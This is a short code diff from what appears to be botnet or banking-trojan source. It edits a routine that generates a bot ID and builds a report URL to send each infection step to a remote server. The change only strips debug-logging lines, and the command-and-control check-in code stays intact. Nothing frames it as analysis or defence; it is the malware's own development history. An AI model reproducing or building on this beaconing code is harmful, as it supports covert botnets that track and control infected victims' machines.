@@ -20,21 +20,15 @@ void DebugReportStepByName(const char* StepName)
 	
 	m_memset(BotUid, 0, sizeof(BotUid));
 
-	DBGRPTDBG("DebugReportStepByName", "Step1");
 	GenerateUid(BotUid);
-	DBGRPTDBG("DebugReportStepByName", "Step2");
 
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "step");
 	AddURLParam(Fields, "uid", BotUid);
 	AddURLParam(Fields, "step", (PCHAR)StepName);
 
-	DBGRPTDBG("DebugReportStepByName", "Step3");
-
 	PCHAR Params = Strings::GetText(Fields, "&");
 	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
-
-	DBGRPTDBG("DebugReportStepByName", "Step4");
 
 	DBGRPTDBG("DebugReportStepByName", "go to url='%s'", URL);
 
